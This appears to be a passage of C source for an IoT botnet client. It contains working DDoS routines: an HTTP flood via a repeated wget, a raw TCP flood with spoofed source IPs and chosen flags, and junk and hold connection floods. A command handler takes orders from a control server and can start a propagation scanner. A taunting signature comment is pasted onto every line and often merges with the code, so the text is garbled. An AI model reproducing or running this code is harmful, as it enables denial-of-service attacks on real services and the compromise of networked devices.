} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid sendHTTP(unsigned char *url, int end_time) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int end = time(NULL) + end_time; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FILE *pf; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char command[80]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sprintf(command, "wget --no-check-certificate -q -O /tmp/null "); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
strcat(command, url); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owopf = popen(command,"r"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile(end > time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
system(command); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned int pollRegister; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pollRegister = pollinterval; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owodest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(port == 0) dest_addr.sin_port = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else dest_addr.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(getHost(target, &dest_addr.sin_addr)) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!sockfd) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Failed opening raw socket."); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint tmp = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Failed setting raw headers mode."); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoin_addr_t netmask; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else netmask = ( ~((1 << (32 - spoofit)) - 1) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct iphdr *iph = (struct iphdr *)packet; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomakeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owotcph->source = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->seq = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->ack_seq = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->doff = 5; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(flags, "all")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->syn = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->rst = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->fin = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->ack = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->psh = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *pch = strtok(flags, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(pch) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!strcmp(pch,         "syn")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->syn = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(!strcmp(pch,  "rst")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->rst = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(!strcmp(pch,  "fin")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->fin = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(!strcmp(pch,  "ack")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->ack = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(!strcmp(pch,  "psh")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->psh = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Invalid flag \"%s\"", pch); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pch = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owotcph->window = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->check = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->urg_ptr = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->dest = (port == 0 ? rand_cmwc() : htons(port)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->check = tcpcsum(iph, tcph); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoiph->check = csum ((unsigned short *) packet, iph->tot_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint end = time(NULL) + timeEnd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoiph->saddr = htonl( getRandomIP(netmask) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->id = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->seq = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->source = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->check = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tcph->check = tcpcsum(iph, tcph); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->check = csum ((unsigned short *) packet, iph->tot_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(i == pollRegister) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(time(NULL) > end) break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid sendJUNK(unsigned char *ip, int port, int end_time) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint max = getdtablesize() / 2, i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(getHost(ip, &dest_addr.sin_addr)) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct state_t // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int fd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t state; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} fds[max]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds, 0, max * (sizeof(int) + 1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owofd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
socklen_t lon; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int valopt, res; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *watwat = malloc(1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(watwat, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint end = time(NULL) + end_time; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(end > time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < max; i++) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
switch(fds[i].state) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case 0: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else fds[i].state = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 1: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fds[i].fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 10000; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(res == 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
lon = sizeof(int); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(valopt) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 2; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(res == -1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 2: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
makeRandomStr(watwat, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid sendHOLD(unsigned char *ip, int port, int end_time) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint max = getdtablesize() / 2, i; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(getHost(ip, &dest_addr.sin_addr)) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct state_t // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int fd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t state; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} fds[max]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds, 0, max * (sizeof(int) + 1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owofd_set myset; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval tv; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
socklen_t lon; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int valopt, res; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *watwat = malloc(1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(watwat, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint end = time(NULL) + end_time; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(end > time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < max; i++) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
switch(fds[i].state) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case 0: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else fds[i].state = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 1: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fds[i].fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 10000; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(res == 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
lon = sizeof(int); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(valopt) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 2; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(res == -1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 2: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fds[i].fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 10000; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
res = select(fds[i].fd+1, NULL, NULL, &myset, &tv); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(res != 0) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid processCmd(int argc, unsigned char *argv[]) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int x; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!strcmp(argv[0], "PING")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "PONG!"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "GETLOCALIP")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "SCANNER")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc != 2) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "SCANNER ON | OFF"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[1], "OFF")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(scanPid == 0) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
kill(scanPid, 9); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "REMOVING PROBE"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
scanPid = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[1], "ON")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(scanPid != 0) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t parent; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
parent = fork(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif (parent > 0) { scanPid = parent; return;} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else if(parent == -1) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "PROBING"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
StartTheLelz(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "HOLD")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockprintf(mainCommSock, "HOLD <ip> <port> <time>"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *ip = argv[1]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int port = atoi(argv[2]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int time = atoi(argv[3]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strstr(ip, ",") != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *hi = strtok(ip, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(hi != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!listFork()) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendHOLD(hi, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
hi = strtok(NULL, ","); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) { return; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owosendHOLD(ip, port, time); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
_exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(!strcmp(argv[0], "JUNK")) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockprintf(mainCommSock, "JUNK <ip> <port> <time>"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

